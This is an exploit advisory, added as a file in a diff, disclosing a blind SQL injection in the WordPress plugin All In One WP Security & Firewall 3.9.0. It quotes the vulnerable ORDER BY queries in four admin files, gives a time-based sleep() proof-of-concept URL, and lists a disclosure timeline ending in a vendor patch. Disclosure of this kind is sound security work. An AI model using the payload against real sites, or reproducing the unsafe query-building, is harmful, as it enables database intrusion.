@@ -1,0 +1,90 @@
+######################
+
+# Exploit Title : WordPress All In One WP Security & Firewall 3.9.0 SQL Injection Vulnerability
+
+# Exploit Author : Claudio Viviani
+
+# Vendor Homepage : https://wordpress.org/plugins/all-in-one-wp-security-and-firewall/
+
+# Software Link : https://mega.co.nz/#!DJAEBLBS!IBiukGo-pirelHmsRV80xZDHIvpqZKtTIqsD8YrMf7U
+
+# Date : 2015-04-05
+
+# Tested on : Linux / Mozilla Firefox
+ 
+######################
+
+# Description
+
+ WordPress All In One WP Security & Firewall 3.9.0 suffers from Blind SQL Injection vulnerability
+ 
+ There are some pages with wordpress esc_sql function. 
+ esc_sql is prone to Blind SQL Injection (discovered by Ryan Dewhurst - http://dewhurstsecurity.com/)
+ 
+ isset($_GET["orderby"]) ? $orderby = strip_tags($_GET["orderby"]): $orderby = '';
+ isset($_GET["order"]) ? $order = strip_tags($_GET["order"]): $order = '';
+ 
+ - admin/wp-security-list-404.php
+ 
+ $orderby = !empty($orderby) ? esc_sql($orderby) : 'id';
+ $order = !empty($order) ? esc_sql($order) : 'DESC';
+ ...
+ ...
+ $data = $wpdb->get_results("SELECT * FROM $events_table_name ORDER BY $orderby $order", ARRAY_A);
+ 
+ 
+ - admin/wp-security-list-login-fails.php
+ 
+ $orderby = !empty($orderby) ? esc_sql($orderby) : 'failed_login_date';
+ $order = !empty($order) ? esc_sql($order) : 'DESC';
+ 
+ $data = $wpdb->get_results("SELECT * FROM $failed_logins_table_name ORDER BY $orderby $order", ARRAY_A);
+ 
+ 
+ - admin/wp-security-list-acct-activity-php
+ 
+ $orderby = !empty($orderby) ? esc_sql($orderby) : 'login_date';
+ $order = !empty($order) ? esc_sql($order) : 'DESC';
+ 
+ $data = $wpdb->get_results("SELECT * FROM $login_activity_table ORDER BY $orderby $order LIMIT 50", ARRAY_A)
+ 
+ 
+ - admin/wp-security-list-locked-ip.php
+ 
+ $orderby = !empty($orderby) ? esc_sql($orderby) : 'failed_login_date';
+ $order = !empty($order) ? esc_sql($order) : 'DESC';
+ 
+ $data = $wpdb->get_results("SELECT * FROM $lockdown_table_name WHERE release_date > now() ORDER BY $orderby $order", ARRAY_A)
+
+######################
+
+# PoC
+
+ http://VICTIM//wp-admin/admin.php?page=aiowpsec&tab=tab3&orderby=user_id,(select * from (select(sleep(30)))a)&order=asc
+
+
+######################
+
+# Vulnerability Disclosure Timeline:
+
+2015-04-05: Discovered vulnerability
+2015-04-06: Vendor Notification
+2015-04-06: Vendor Response/Feedback 
+2015-04-07: Vendor Send Fix/Patch (3.9.1)
+2015-04-07: Public Disclosure 
+
+#######################
+
+Discovered By : Claudio Viviani
+                http://www.homelab.it
+                http://ffhd.homelab.it (Free Fuzzy Hashes Database)
+ 
+                info@homelab.it
+                homelabit@protonmail.ch
+
+                https://www.facebook.com/homelabit
+                https://twitter.com/homelabit
+                https://plus.google.com/+HomelabIt1/
+                https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww
+
+#####################
